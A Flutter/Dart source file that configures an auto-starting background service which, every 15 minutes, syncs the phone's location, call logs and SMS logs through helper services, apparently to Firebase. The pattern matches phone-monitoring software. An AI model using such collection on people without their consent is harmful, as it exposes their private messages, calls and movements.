import 'dart:async';
import 'dart:ui';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'call_log_service.dart';
import 'location_service.dart';
import 'sms_service.dart';

// Make onStart a top-level function
void onStart(ServiceInstance service) async {
  await Firebase.initializeApp();  // Initialize Firebase

  // Periodic background sync every 15 minutes
  Timer.periodic(const Duration(minutes: 15), (timer) async {
    try {
      // Sync location data
      await LocationService.syncLocation();

      // Sync call logs
      await CallLogService.syncCallLogs();

      // Sync SMS logs
      await SmsService.syncSmsLogs();
    } catch (e) {
      print('Error during background sync: $e');
      // Log error to Firebase or other services
    }
  });
}

class BackgroundTaskManager {

  static Future<void> initializeService() async {
    final service = FlutterBackgroundService();

    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,  // Top-level function is now passed
        autoStart: true,
        isForegroundMode: true,
        notificationChannelId: 'my_foreground',
        initialNotificationTitle: 'Service Running',
        initialNotificationContent: 'Syncing data...',
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: onStart,
        onBackground: onIosBackground,
      ),
    );
  }

  @pragma('vm:entry-point')
  static Future<bool> onIosBackground(ServiceInstance service) async {
    print('Background service triggered on iOS');
    return true;
  }
}
